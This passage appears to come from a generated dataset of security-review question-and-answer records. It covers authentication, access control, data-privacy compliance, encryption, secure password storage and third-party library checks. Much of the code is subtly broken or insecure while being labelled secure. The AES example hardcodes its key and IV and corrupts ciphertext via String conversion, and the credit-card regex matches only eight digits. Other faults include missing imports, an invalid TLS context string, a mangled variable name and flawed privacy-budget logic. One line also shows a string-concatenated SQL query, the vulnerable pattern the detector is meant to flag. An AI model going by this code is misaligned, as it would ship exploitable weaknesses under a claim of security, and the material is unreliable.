LoginManager()\nlogin_manager.init_app(app)\n\nclass User(UserMixin):\n    def __init__(self, google_user):\n        self.id = google_user['id']\n\n@login_manager.user_loader\ndef load_user(user_id):\n    # Fetch user data from the database based on the id\n    return User(google_user_data)  # Assuming 'google_user_data' is fetched from the DB\n\ngoogle_bp = make_google_blueprint(\n    scope=[\"openid\", \"email\", \"profile\"],\n    offline=True  # Request offline access for refresh tokens\n)\napp.register_blueprint(google_bp, url_prefix=\"/login\")\n\n@app.route('/')\n@login_required\ndef home():\n    return \"Welcome, {}!\".format(google.me().get('name'))\n\n@app.route('/logout')\n@login_required\ndef logout():\n    session.clear()\n    logout_user()\n    return redirect(url_for('index'))\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```\n\nIn this example, Flask-Dance is used to simplify the OAuth flow with Google. The application ensures secure redirects, validates tokens, and uses HTTPS by default. Additionally, it uses Flask-Login for session management and user authentication."}, {"L2_TASK": "Security Review", "L3_TASK": "Authentication mechanism review", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a secure multi-factor authentication (MFA) system that leverages time-based one-time passwords (TOTP) and public-key cryptography for user authentication. The system should prevent brute-force attacks, session hijacking, and man-in-the-middle (MITM) attacks.\n\n**Concept**: Authentication Mechanisms, Public Key Cryptography, Time-Based One-Time Passwords (TOTP), Brute-Force Protection, Session Security, MITM Protection\n\n**Solution**:\n\n1. Use a TOTP library, like `pyotp` in Python, to generate time-based one-time passwords for users.\n2. Implement public-key cryptography for exchanging and verifying secrets securely.\n3. Use rate-limiting and account lockout mechanisms to prevent brute-force attacks.\n4. Employ secure session management to protect against session hijacking.\n5. Use HTTPS and certificate pinning to protect against MITM attacks.\n\n```python\nimport pyotp\nimport socket\nimport time\nimport hashlib\nimport base64\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.primitives import serialization, hashes\nfrom cryptography.hazmat.primitives.asymmetric import padding\nfrom flask import Flask, request, session\n\napp = Flask(__name__)\napp.secret_key = 'your_app_secret_key'\n\n# Generate TOTP secret for new users\ndef generate_totp_secret():\n    return pyotp.random_base32()\n\n# Generate public/private key pair\ndef generate_key_pair():\n    private_key = rsa.generate_private_key(\n        public_exponent=65537,\n        key_size=2048\n    )\n    public_key = private_key.public_key()\n    return private_key, public_key\n\n# Verify TOTP and public-key signature\ndef verify_mfa(public_key, totp_secret, signature, otp_code):\n    totp = pyotp.TOTP(totp_secret)\n    if totp.verify(otp_code):\n        try:\n            public_key.verify(\n                base64.b64decode(signature),\n                hashlib.sha256(str(otp_code).encode()).digest(),\n                padding.PSS(\n                    mgf=padding.MGF1(hashes.SHA256()),\n                    salt_length=padding.PSS.MAX_LENGTH\n                ),\n                hashes.SHA256()\n            )\n            return True\n        except Exception as e:\n            print(f\"Signature verification failed: {e}\")\n    return False\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form.get('username')\n    password = request.form.get('password')\n    otp_code = request.form.get('otp_code')\n    signature = request.form.get('signature')\n\n    # Authenticate user with username and password\n    if authenticate_user(username, password):\n        # Fetch user's TOTP secret and public key\n        totp_secret = fetch_totp_secret(username)\n        public_key = fetch_public_key(username)\n\n        # Verify MFA\n        if verify_mfa(public_key, totp_secret, signature, otp_code):\n            # Generate a secure session token\n            session_token = generate_session_token()\n            session['user_id'] = username\n            session['session_token'] = session_token\n\n            # Store session token in database, associating it with the user\n            store_session_token(username, session_token)\n\n            return \"Authenticated successfully\"\n        else:\n            return \"MFA verification failed\"\n    else:\n        return \"Invalid credentials\"\n\n# ... Other utility functions for authentication, session management, and database interactions ...\n\nif __name__ == '__main__':\n    app.run()\n```\n\nQuestion 2: Create a secure OAuth 2.0 authorization server that integrates with a custom identity provider, implements refresh tokens, and enforces self-issuing and revocability of access tokens to prevent token theft and misuse.\n\n**Concept**: OAuth 2.0, Identity Providers, Token Management, Token Revocation, Self-Issuing Tokens\n\n**Solution**:\n\n1. Implement an OAuth 2.0 authorization server using a library like `flask-oauthlib` in Python.\n2. Integrate with a custom identity provider for user authentication and authorization.\n3. Use JSON Web Tokens (JWT) for access and refresh tokens, including self-issuing claims.\n4. Store and manage token revocation lists to mitigate token theft.\n5. Implement secure token introspection and revocation endpoints.\n\n```python\nfrom flask import Flask, request, jsonify\nfrom flask_oauthlib.provider import OAuth2Provider\nfrom flask_jwt_extended import JWTManager, create_access_token, create_refresh_token, get_jwt_identity, get_raw_jwt, verify_jwt_in_request\nfrom sqlalchemy import create_engine, Column, Integer, String, DateTime, Boolean\nfrom sqlalchemy.ext.declarative import declarative_base\nfrom sqlalchemy.orm import scoped_session, sessionmaker\n\napp = Flask(__name__)\napp.config['SECRET_KEY'] = 'your_app_secret_key'\napp.config['OAUTH2_SERVER_NAME'] = 'your_oauth_server'\napp.config['OAUTH2_ACCESS_TOKEN_EXPIRES'] = 3600\napp.config['OAUTH2_REFRESH_TOKEN_EXPIRES'] = 86400\napp.config['JWT_ACCESS_TOKEN_EXPIRES'] = 3600\napp.config['JWT_REFRESH_TOKEN_EXPIRES'] = 86400\n\noauth = OAuth2Provider(app)\njwt = JWTManager(app)\n\nengine = create_engine('sqlite:///oauth.db')\ndb_session = scoped_session(sessionmaker(autocommit=False, autoflush=False, bind=engine))\nBase = declarative_base()\nBase.query = db_session.query_property()\n\nclass User(Base):\n    __tablename__ = 'users'\n    id = Column(Integer, primary_key=True)\n    username = Column(String(80), unique=True)\n    password = Column(String(120))\n\nclass Token(Base):\n    __tablename__ = 'tokens'\n    id = Column(Integer, primary_key=True)\n    user_id = Column(Integer, ForeignKey('users.id'))\n    token_type = Column(String(20))\n    access_token = Column(String(255))\n    refresh_token = Column(String(255))\n    created = Column(DateTime)\n    expires = Column(DateTime)\n    revoked = Column(Boolean, default=False)\n\nBase.metadata.create_all(bind=engine)\n\n# ... User and token management functions ...\n\n@jwt.user_loader_callback_loader\ndef user_loader_callback(identity):\n    return User.query.filter_by(username=identity).first()\n\n@app.route('/oauth/token', methods=['POST'])\n@oauth.token_handler\ndef access_token():\n    verify_jwt_in_request()\n    user = User.query.get(get_jwt_identity())\n    refresh_token = create_refresh_token(identity=user.id)\n    access_token = create_access_token(identity=user.id, expires_delta=False)\n    return {\n        'access_token': access_token,\n        'refresh_token': refresh_token,\n        'token_type': 'Bearer',\n        'expires_in': app.config['JWT_ACCESS_TOKEN_EXPIRES']\n    }\n\n# ... Other OAuth 2.0 endpoints, token introspection, and revocation ...\n\nif __name__ == '__main__':\n    app.run()\n```\n\nThese examples demonstrate complex authentication mechanisms using TOTP, public-key cryptography, and OAuth 2.0 with JWT tokens. They address security concerns like brute-force attacks, session hijacking, MITM attacks, token theft, and token revocation. The complexity comes from integrating multiple technologies and implementing secure token management practices."}, {"L2_TASK": "Security Review", "L3_TASK": "Access control checks", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: A medium-sized e-commerce platform needs to enforce access control checks on its product pages, ensuring that only authenticated and authorized users can view and perform actions on specific products. The platform is built using Python and Django framework.\n\nSolution:\nConcept: Web Development (Access Control)\n\n```python\n# models.py\nfrom django.contrib.auth.models import User\n\nclass Product(models.Model):\n    title = models.CharField(max_length=100)\n    description = models.TextField()\n    price = models.DecimalField(max_digits=5, decimal_places=2)\n    creator = models.ForeignKey(User, on_delete=models.CASCADE, related_name='created_products')\n\n    def __str__(self):\n        return self.title\n\nclass ProductAccess(models.Model):\n    product = models.ForeignKey(Product, on_delete=models.CASCADE)\n    user = models.ForeignKey(User, on_delete=models.CASCADE)\n    can_view = models.BooleanField(default=True)\n    can_purchase = models.BooleanField(default=True)\n\n    def __str__(self):\n        return f'{self.user.username} - {self.product.title}'\n\n\n# views.py\nfrom django.contrib.auth.decorators import login_required\nfrom django.http import HttpResponseForbidden\nfrom django.shortcuts import get_object_or_404\n\n@login_required\ndef product_detail(request, product_id):\n    product = get_object_or_404(Product, pk=product_id)\n    product_access = get_object_or_404(ProductAccess, product=product, user=request.user)\n\n    if not product_access.can_view:\n        return HttpResponseForbidden('You are not authorized to view this product.')\n\n    # Other views logic for rendering the product details\n\n\n@login_required\ndef purchase_product(request, product_id):\n    product = get_object_or_404(Product, pk=product_id)\n    product_access = get_object_or_404(ProductAccess, product=product, user=request.user)\n\n    if not product_access.can_purchase:\n        return HttpResponseForbidden('You are not authorized to purchase this product.')\n\n    # Logic to process the purchase\n    # ...\n\n    return redirect('success_url')\n```\n\n\nQuestion 2:\nProblem: An iOS mobile app requires a secure way to manage access to user-specific resources like documents, images, and videos. The app is built with Swift, and it needs to ensure that only the authenticated user can access their own files, preventing unauthorized access to other users' data.\n\nSolution:\nConcept: Mobile Development (Access Control - Security)\n\n```swift\nimport Foundation\nimport FileManager\n\nclass SecureFileManager {\n    \n    static let shared = SecureFileManager()\n    \n    private let documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!\n    \n    func saveUserFile(userId: String, fileName: String, data: Data) {\n        let userDirectory = documentsDirectory.appendingPathComponent(userId)\n        try? FileManager.default.createDirectory(atPath: userDirectory.path, withIntermediateDirectories: true, attributes: nil)\n        \n        let secureURL = userDirectory.appendingPathComponent(fileName)\n        do {\n            try data.write(to: secureURL)\n        } catch {\n            print(\"Error saving file: \\(error.localizedDescription)\")\n        }\n    }\n    \n    func getUserFile(userId: String, fileName: String) -> Data? {\n        let userDirectory = documentsDirectory.appendingPathComponent(userId)\n        guard FileManager.default.fileExists(atPath: userDirectory.path) else {\n            return nil\n        }\n        \n        let secureURL = userDirectory.appendingPathComponent(fileName)\n        do {\n            return try Data(contentsOf: secureURL)\n        } catch {\n            print(\"Error loading file: \\(error.localizedDescription)\")\n            return nil\n        }\n    }\n    \n    func removeUserFile(userId: String, fileName: String) {\n        let userDirectory = documentsDirectory.appendingPathComponent(userId)\n        let secureURL = userDirectory.appendingPathComponent(fileName)\n        \n        do {\n            try FileManager.default.removeItem(at: secureURL)\n        } catch {\n            print(\"Error removing file: \\(error.localizedDescription)\")\n        }\n    }\n}\n\n// Usage:\nlet userId = \"user123\"\nlet imageData: Data = ... // User's image data\nSecureFileManager.shared.saveUserFile(userId: userId, fileName: \"profileImage.png\", data: imageData)\n\nif let loadedImageData = SecureFileManager.shared.getUserFile(userId: userId, fileName: \"profileImage.png\") {\n    // Display the loaded image\n} else {\n    // Handle file not found or error\n}\n```\n\nThese examples demonstrate how to implement access control checks in a web application and a mobile app, ensuring that users can only access their own resources and not those belonging to other users. The Django example enforces access control in views, while the Swift example uses a custom file manager class to manage user-specific files securely."}, {"L2_TASK": "Security Review", "L3_TASK": "Access control checks", "Complexity_Level": "extremely difficult", "Response": "```json\n{\n  \"Concept\": \"Access Control Checks\"\n}\n```\nQuestion 1: Develop an access control system that uses role-based access control (RBAC) and attribute-based access control (ABAC) with a hierarchical structure for a multinational corporation. The system should enforce fine-grained permissions, handle complex relationships between roles, attributes, and resources, and dynamically adapt access rights based on the current context.\n\nSolution:\n```python\nimport json\nfrom functools import wraps\n\nclass ABACPermission:\n    def __init__(self, attributes):\n        self.attributes = attributes\n\nclass RBACRole:\n    def __init__(self, name, permissions):\n        self.name = name\n        self.permissions = permissions\n\nclass RBACUser:\n    def __init__(self, username, roles, attributes):\n        self.username = username\n        self.roles = roles\n        self.attributes = attributes\n\ndef access_check(role_permissions, user_attributes, resource):\n    for role_permission in role_permissions:\n        if role_permission in user_attributes['roles']:\n            for attr in role_permission.permissions.attributes:\n                if attr in user_attributes['attributes']:\n                    return True\n    return False\n\ndef require_access(permissions):\n    def decorator(func):\n        @wraps(func)\n        def wrapper(user, *args, **kwargs):\n            if access_check(permissions, user.attributes, kwargs.get('resource')):\n                return func(user, *args, **kwargs)\n            else:\n                raise Exception(\"Access denied\")\n        return wrapper\n    return decorator\n\n# Define roles and permissions\nrole_a = RBACRole('RoleA', [ABACPermission(['attribute1', 'attribute2'])])\nrole_b = RBACRole('RoleB', [ABACPermission(['attribute3'])])\n\n# Define users and their attributes\nuser1 = RBACUser('user1', [role_a], {'attributes': ['attribute1', 'attribute2', 'attribute4']})\nuser2 = RBACUser('user2', [role_b], {'attributes': ['attribute3', 'attribute4']})\n\n# Resource with attributes\nresource = {'attributes': ['attribute2', 'attribute5']}\n\n# Function requiring specific access\n@require_access([role_a, role_b])\ndef sensitive_operation(user, resource):\n    print(f\"Sensitive operation executed by {user.username}\")\n\n# Test the access control\ntry:\n    sensitive_operation(user1, resource)\nexcept Exception as e:\n    print(str(e))\n\ntry:\n    sensitive_operation(user2, resource)\nexcept Exception as e:\n    print(str(e))\n```\nQuestion 2: Implement a distributed, fault-tolerant access control service using a consensus protocol, such as Raft, to manage roles, permissions, and user attributes across multiple nodes in the network. The service should handle updates to the access control policy, ensure consistency, and provide high availability.\n\nSolution:\nThis problem requires a complex distributed system design involving multiple components and would typically be implemented in a language like Go, Java, or C++. Here's a high-level overview of the solution:\n\n1. Implement a Raft consensus algorithm in your chosen language for managing the state of roles, permissions, and user attributes across nodes.\n2. Design a distributed key-value store using the Raft consensus for storing and retrieving access control information.\n3. Create a client SDK for submitting access control updates (role creation, permission assignment, user attribute modification) to the distributed store.\n4. Implement a background service that replicates changes to all nodes in the network using Raft.\n5. Design a load balancer that routes requests to available nodes, ensuring high availability.\n6. Develop an access control policy engine that evaluates the policy based on the current state in the distributed store.\n7. Implement a failure recovery mechanism that can restore the system to a consistent state after node failures.\n\nDue to the complexity of the problem, a detailed code example is not feasible. However, you can explore existing libraries and frameworks for implementing Raft and distributed key-value stores (such as etcd or Consul) as a starting point for developing such a system."}, {"L2_TASK": "Security Review", "L3_TASK": "Data privacy compliance", "Complexity_Level": "medium", "Response": "Area: \"Security Review\"\nSub Area: \"Data privacy compliance\"\n\nQuestion 1: Develop a function in Python that checks if a given dataset (CSV file) contains any personally identifiable information (PII) like email addresses, phone numbers, or credit card numbers before uploading it to a cloud storage service.\n\n**Concept**: Regular Expressions, CSV Handling\n\n```python\nimport re\nimport csv\n\ndef contains_pii(file_path):\n    pii_patterns = [\n        r'\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b',  # Email\n        r'\\+?\\d{1,2}\\s?\\d{3}\\s?\\d{3}\\s?\\d{4}',  # Phone\n        r'\\b(?:\\d{4}-?\\d{4}|\\d{4}\\s\\d{4}|\\d{4}\\.\\d{4}|\\d{4}[-. ]\\d{4})\\b'  # Credit Card\n    ]\n    \n    with open(file_path, 'r', newline='') as csvfile:\n        reader = csv.reader(csvfile, delimiter=',', quotechar='\"')\n        for row in reader:\n            for field in row:\n                for pattern in pii_patterns:\n                    if re.search(pattern, field, re.IGNORECASE):\n                        return True\n    return False\n\n# Example usage\ndataset_path = 'data.csv'\nif contains_pii(dataset_path):\n    print(\"The dataset contains PII. Please review before uploading.\")\nelse:\n    print(\"The dataset does not contain PII.\")\n```\n\nQuestion 2: Write a Java program to encrypt sensitive user data (e.g., passwords) stored in a JSON file using AES encryption before saving it to disk, ensuring compliance with data privacy standards.\n\n**Concept**: JSON Handling, AES Encryption, Key Management\n\n```java\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.security.Key;\nimport java.security.spec.AlgorithmParameterSpec;\nimport javax.crypto.Cipher;\nimport javax.crypto.spec.IvParameterSpec;\nimport javax.crypto.spec.SecretKeySpec;\nimport org.json.JSONObject;\n\npublic class SecureDataSaver {\n    private static final String ALGORITHM = \"AES/CBC/PKCS5Padding\";\n    private static final byte[] keyValue = new byte[] { 'T', 'h', 'i', 's', 'I', 's', 'A', 'S', 'e', 'c', 'u', 'r', 'e', 'K', 'e', 'y' };\n    private static final byte[] ivValue = new byte[] { '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '1', '2', '3', '4', '5', '6' };\n    \n    public static void encryptAndSave(JSONObject data, String filePath) throws Exception {\n        Key key = new SecretKeySpec(keyValue, \"AES\");\n        AlgorithmParameterSpec ivSpec = new IvParameterSpec(ivValue);\n        Cipher cipher = Cipher.getInstance(ALGORITHM);\n        cipher.init(Cipher.ENCRYPT_MODE, key, ivSpec);\n        \n        for (String keyStr : data.keySet()) {\n            String valueStr = data.getString(keyStr);\n            byte[] encryptedBytes = cipher.doFinal(valueStr.getBytes());\n            data.put(keyStr, new String(encryptedBytes));\n        }\n        \n        Files.write(Paths.get(filePath), data.toString().getBytes());\n    }\n\n    // Add decryption method for testing or future use\n    // ...\n\n    public static void main(String[] args) throws Exception {\n        JSONObject userData = new JSONObject();\n        userData.put(\"username\", \"john_doe\");\n        userData.put(\"password\", \"secure_password\");\n\n        encryptAndSave(userData, \"encrypted_data.json\");\n        System.out.println(\"Data encrypted and saved successfully.\");\n    }\n}\n```\n\nThese examples help ensure data privacy compliance by checking for sensitive information in a dataset and encrypting sensitive user data before storing it."}, {"L2_TASK": "Security Review", "L3_TASK": "Data privacy compliance", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a system that implements data privacy principles according to the GDPR (General Data Protection Regulation) and ensures pseudonymization of user data while maintaining data utility for analytics purposes. The system should be able to detect and prevent unauthorized access attempts and perform automated data erasure upon user request.\n\nConcept: \"Data Privacy Compliance\"\n\nSolution:\n```python\nimport hashlib\nfrom cryptography.fernet import Fernet\nfrom sqlalchemy import create_engine, Column, Integer, String, ForeignKey\nfrom sqlalchemy.ext.declarative import declarative_base\nfrom sqlalchemy.orm import relationship\n\nBase = declarative_base()\n\nclass User(Base):\n    __tablename__ = 'users'\n\n    id = Column(Integer, primary_key=True)\n    pseudonym = Column(String, unique=True)\n    encrypted_data = relationship('EncryptedData', back_populates='user')\n\nclass EncryptedData(Base):\n    __tablename__ = 'encrypted_data'\n\n    id = Column(Integer, primary_key=True)\n    user_id = Column(Integer, ForeignKey('users.id'))\n    user = relationship('User', back_populates='encrypted_data')\n    cipher_text = Column(String)\n    salt = Column(String)\n\ndef generate_pseudonym():\n    return hashlib.sha256(os.urandom(32)).hexdigest()\n\ndef encrypt_data(user_id, data):\n    salt = os.urandom(16)\n    key = hashlib.pbkdf2_hmac('sha256', b'secret_key', salt, 100000, dklen=32)\n    f = Fernet(key)\n    cipher_text = f.encrypt(data.encode())\n    encrypted_data = EncryptedData(user_id=user_id, cipher_text=cipher_text.hex(), salt=salt.hex())\n    db_session.add(encrypted_data)\n    db_session.commit()\n\ndef decrypt_data(encrypted_data):\n    salt = bytes.fromhex(encrypted_data.salt)\n    key = hashlib.pbkdf2_hmac('sha256', b'secret_key', salt, 100000, dklen=32)\n    f = Fernet(key)\n    cipher_text = bytes.fromhex(encrypted_data.cipher_text)\n    return f.decrypt(cipher_text).decode()\n\ndef detect_unauthorized_access(user_pseudonym, data_id):\n    user = User.query.filter_by(pseudonym=user_pseudonym).first()\n    if not user or data_id not in [data.id for data in user.encrypted_data]:\n        raise UnauthorizedAccessError(\"Access denied\")\n\ndef erase_user_data(user_pseudonym):\n    user = User.query.filter_by(pseudonym=user_pseudonym).first()\n    if user:\n        for data in user.encrypted_data:\n            db_session.delete(data)\n        db_session.delete(user)\n        db_session.commit()\n\n# Example usage\ndb_engine = create_engine('sqlite:///data_storage.db')\ndb_session = scoped_session(sessionmaker(bind=db_engine))\n\nuser = User(pseudonym=generate_pseudonym())\ndb_session.add(user)\ndb_session.commit()\n\ndata = \"Sensitive user information\"\nencrypt_data(user.id, data)\n\n# Later, when a user requests data erasure\nerase_user_data(user.pseudonym)\n```\nNote: This is a simplified example and does not cover all aspects of GDPR compliance, such as logging, user consent, and data breach notification. A real-world implementation would involve more complex systems and integration with other tools.\n\nQuestion 2: Implement a system that performs differential privacy on a dataset while handling streams of real-time data updates. The system should ensure that the data is protected from re-identification attacks and maintain a strict privacy budget (\u03b5) over time.\n\nConcept: \"Data Privacy Compliance\"\n\nSolution:\n```python\nimport numpy as np\nfrom random import random\nfrom scipy.stats import laplace\n\ndef laplaceNoise(mu, epsilon, sensitivity):\n    return laplace.rvs(loc=mu, scale=sensitivity/epsilon)\n\ndef add_differential_privacy(data, epsilon, sensitivity):\n    private_data = []\n    total_epsilon = 0\n    for value in data:\n        if total_epsilon + epsilon > 1:\n            break\n        noisy_value = value + laplaceNoise(0, epsilon, sensitivity)\n        private_data.append(noisy_value)\n        total_epsilon += epsilon\n    return private_data\n\ndef process_real_time_data(stream, epsilon, sensitivity, private_data_buffer):\n    while True:\n        new_data = stream.get()\n        if new_data is None:\n            break\n        private_data_buffer.append(new_data)\n        if len(private_data_buffer) >= 100:  # Batch processing\n            private_data_buffer = add_differential_privacy(private_data_buffer, epsilon, sensitivity)\n            private_data_buffer = private_data_buffer[-100:]  # Keep the latest 100 records\n\n# Example usage\nstream = RealTimeDataStream()  # This would be a custom class to handle real-time data\nepsilon_per_batch = 0.01\nsensitivity = 1  # Assuming each data point can differ by at most 1 unit\n\nprivate_data_buffer = []\nprocess_real_time_data(stream, epsilon_per_batch, sensitivity, private_data_buffer)\n```\nThis example demonstrates a basic approach to applying differential privacy with a fixed privacy budget (\u03b5) to real-time data updates. The system continuously processes incoming data, adding Laplace noise to each value to protect individual records. The `epsilon_per_batch` determines how much privacy budget is allocated to each batch, and the `sensitivity` indicates the maximum difference between any two data points. The buffer size and batch processing frequency would need to be adjusted based on the specific use case and privacy requirements."}, {"L2_TASK": "Security Review", "L3_TASK": "Security best practices", "Complexity_Level": "medium", "Response": "Question 1: How to implement secure password storage and validation in a web application, following security best practices?\n\nConcept: Authentication & Authorization\n\nSolution:\nIn a web application, it's crucial to store user passwords securely to prevent unauthorized access in case of a data breach. A common best practice is to use a combination of password hashing, salting, and a slow hashing algorithm like bcrypt.\n\nHere's an example in Python using the `bcrypt` library:\n\n```python\nimport bcrypt\n\ndef hash_password(password):\n    \"\"\"Generate a secure hash for the given password\"\"\"\n    salt = bcrypt.gensalt()  # Generate a random salt\n    hashed_password = bcrypt.hashpw(password.encode('utf-8'), salt)\n    return hashed_password\n\ndef validate_password(hashed_password, user_input_password):\n    \"\"\"Check if the user's input matches the hashed password\"\"\"\n    is_valid = bcrypt.checkpw(user_input_password.encode('utf-8'), hashed_password)\n    return is_valid\n\n# Example usage\nuser_password = \"mySecurePassword123\"\nhashed_password = hash_password(user_password)\nprint(\"Hashed password:\", hashed_password)\n\nuser_input = input(\"Enter your password: \")\nis\u5339\u914d = validate_password(hashed_password, user_input)\nif is\u5339\u914d:\n    print(\"Password validation successful.\")\nelse:\n    print(\"Invalid password.\")\n```\n\nQuestion 2: How to implement secure communication between a client and a server using HTTPS in a web application?\n\nConcept: Network Security\n\nSolution:\nTo ensure secure communication between a client and a server, you should use HTTPS, which provides encryption and authentication. Here's an example of how to enable HTTPS in a Python Flask application using a self-signed certificate (for development purposes only, not recommended for production):\n\n```python\nfrom flask import Flask, request\nfrom OpenSSL import SSL\n\napp = Flask(__name__)\n\ncontext = SSL.Context('tlsv1_2')  # Choose the SSL/TLS version you want to support\ncontext.use_privatekey_file('server.key')  # Your private key file\ncontext.use_certificate_file('server.crt')  # Your server certificate file\n\n@app.route('/')\ndef hello_world():\n    return \"Hello, World!\"\n\nif __name__ == '__main__':\n    app.run(ssl_context=context)\n```\n\nIn production, you should obtain a trusted SSL/TLS certificate from a Certificate Authority (CA) and replace the self-signed certificate and key files. Additionally, configure your server to redirect all HTTP traffic to HTTPS to enforce secure connections.\n\nNote: For Node.js and Express, you would use the `https` module, and for other languages, there are equivalent libraries or built-in mechanisms to enable HTTPS."}, {"L2_TASK": "Security Review", "L3_TASK": "Security best practices", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a secure code review tool that utilizes advanced static analysis techniques to detect and mitigate SQL injection vulnerabilities in a complex, multi-layered web application written in Java.\n\n**Concept**: Security Best Practices, Static Code Analysis, SQL Injection\n\n**Solution**: Create a custom Java-based code analysis tool that integrates with the application's build process. The tool should analyze the codebase, identifying potential SQL injection vulnerabilities and suggesting secure alternatives.\n\nExample Java code for a basic SQL injection detection component:\n\n```java\nimport java.util.regex.Pattern;\n\npublic class SQLInjectionDetector {\n    private static final Pattern SQL_PLACEHOLDER_PATTERN = Pattern.compile(\"(?i)(set|update|select|insert|delete)\\\\s+[^=]*=?\\\\s*(['\\\"][^'\\\"]*['\\\"])\");\n\n    public static void detectSQLInjection(String codeBlock) {\n        if (codeBlock != null && !codeBlock.isEmpty()) {\n            Matcher matcher = SQL_PLACEHOLDER_PATTERN.matcher(codeBlock);\n            if (matcher.find()) {\n                System.err.println(\"Potential SQL Injection detected in code block: \" + codeBlock);\n                // Suggest using prepared statements or parameterized queries\n                System.out.println(\"Suggested fix: Use PreparedStatement with placeholders instead.\");\n            }\n        }\n    }\n}\n\n// Example usage in a build script (Maven/Gradle)\n// For Maven, you could use a plugin to execute this code during the build process\npublic class SecureBuildScript {\n    public static void main(String[] args) throws Exception {\n        String codeBlock = \"String query = \\\"SELECT * FROM users WHERE username = '\\\" + userInput + \\\"'\\\";\";\n        SQLInjectionDetector.detectSQLInjection(codeBlock);\n    }\n}\n```\nThis example demonstrates a basic approach to identifying SQL queries with concatenated user inputs, which can lead to SQL injection vulnerabilities. In a real-world scenario, the detector would be more sophisticated, covering various SQL syntaxes and query types, and offering detailed guidelines for fixing the issues.\n\nQuestion 2: Implement a secure key management and encryption system for sensitive data in a distributed Node.js application using the Web Cryptography API and hardware security modules (HSMs).\n\n**Concept**: Security Best Practices, Encryption, Key Management, Hardware Security Modules\n\n**Solution**: Develop a key management system that securely stores encryption keys in HSMs while providing a decentralized API for data encryption and decryption across multiple Node.js instances. The system should enforce strict access control, rotation policies, and support key derivation for different data encryption contexts.\n\nExample Node.js code using the Web Cryptography API:\n\n```javascript\nconst crypto = require('crypto');\nconst { HSMProvider } = require('custom-hsm-provider'); // A hypothetical module for HSM interaction\n\nclass SecureKeyManager {\n    constructor() {\n        this.hsmProvider = new HSMProvider();\n    }\n\n    async generateKey() {\n        const key = await crypto.subtle.generateKey(\n            { name: 'AES-GCM', length: 256 }, // Use other algorithms if needed\n            true,\n            ['encrypt', 'decrypt']\n        );\n\n        const keyHandle = await this.hsmProvider.storeKey(key);\n        return keyHandle;\n    }\n\n    async encrypt(plaintext, keyHandle) {\n        const key = await this.hsmProvider.getKey(keyHandle);\n        const iv = crypto.randomBytes(12);\n        const encrypted = await crypto.subtle.encrypt(\n            { name: 'AES-GCM', iv },\n            key,\n            plaintext\n        );\n\n        return { encrypted, iv };\n    }\n\n    async decrypt(encrypted, iv, keyHandle) {\n        const key = await this.hsmProvider.getKey(keyHandle);\n        const decrypted = await crypto.subtle.decrypt(\n            { name: 'AES-GCM', iv },\n            key,\n            encrypted\n        );\n\n        return new TextDecoder().decode(decrypted);\n    }\n}\n\n// Example usage\nconst keyManager = new SecureKeyManager();\n(async () => {\n    const keyHandle = await keyManager.generateKey();\n    const plaintext = 'Sensitive data';\n    const { encrypted, iv } = await keyManager.encrypt(plaintext, keyHandle);\n    const decrypted = await keyManager.decrypt(encrypted, iv, keyHandle);\n    console.log(decrypted); // Should print 'Sensitive data'\n})();\n```\nThis example shows a simple implementation of a key manager that interacts with an HSM using a custom module. In practice, you would need to integrate with real HSM libraries or APIs, implement key rotation policies, and handle key derivation to support different encryption contexts. Additionally, you'd need to enforce access control and secure communication between the application and HSMs."}, {"L2_TASK": "Security Review", "L3_TASK": "Third-party library security", "Complexity_Level": "medium", "Response": "Domain: Development\nSub Area: Third-party library security\n\nProblem: A software development team is using several third-party libraries in their Java application. They need to implement a medium complexity security review process to identify potential vulnerabilities in these libraries and ensure compliance with their security policies.\n\nQuestion 1: How can the team detect and mitigate known security vulnerabilities in their third-party Java libraries using the OWASP Dependency-Check tool?\n\nSolution 1:\nThe team can use OWASP Dependency-Check, a tool that automatically identifies publicly disclosed vulnerabilities in software dependencies. Here's an example of running Dependency-Check from the command line in a Java project:\n\n```bash\n# Install OWASP Dependency-Check CLI\nwget https://github.com/dependency-check/dependency-check/releases/download/v6.5.2/dependency-check-6.5.2-release.zip\nunzip dependency-check-6.5.2-release.zip\n\n# Navigate to the project directory with the pom.xml file\ncd path/to/your/project\n\n# Run the dependency-check tool\n../dependency-check/bin/dependency-check.sh --project \"My Project\" --scan src/main/java --format XML --out reports\n```\n\nAfter running the command, Dependency-Check generates a report listing potential vulnerabilities. The team can review the report, update vulnerable libraries to secure versions, and add exclusions for false positives.\n\nQuestion 2: How can the team enforce a policy to only allow approved versions of third-party libraries in their Java application using a Maven enforcer rule?\n\nSolution 2:\nThe team can use the `dependencyConvergence` rule in Maven Enforcer Plugin to ensure all dependencies use the same version and comply with the approved versions list. Here's an example `pom.xml` configuration:\n\n```xml\n<project>\n  ...\n  <build>\n    <plugins>\n      <plugin>\n        <groupId>org.apache.maven.plugins</groupId>\n        <artifactId>maven-enforcer-plugin</artifactId>\n        <version>3.0.0-M3</version>\n        <executions>\n          <execution>\n            <id>enforce-approved-versions</id>\n            <goals>\n              <goal>enforce</goal>\n            </goals>\n            <configuration>\n              <rules>\n                <dependencyConvergence>\n                  <unmanagedVersionPolicy>ignore</unmanagedVersionPolicy>\n                  <managedVersionPolicy>warn</managedVersionPolicy>\n                </dependencyConvergence>\n              </rules>\n            </configuration>\n          </execution>\n        </executions>\n      </plugin>\n    </plugins>\n  </build>\n  ...\n</project>\n```\n\nThis configuration enforces that all dependencies have a common version. If a different version of the same library is found, Maven will generate a warning. The team should maintain an approved versions list in their `dependencyManagement` section and update it regularly with secure versions.\n\nTo enforce a stricter policy, the team can change `<managedVersionPolicy>` to `error`, which will cause the build to fail if any unapproved versions are detected."}, {"L2_TASK": "Security Review", "L3_TASK": "Third-party library security", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nGiven a complex Node.js application that integrates multiple third-party libraries, design a robust security review system to identify and mitigate vulnerabilities in these libraries.\n\nConcept: Third-party library security\n\nSolution:\nWe can create a custom security scanner that combines static code analysis, dynamic analysis, and vulnerability 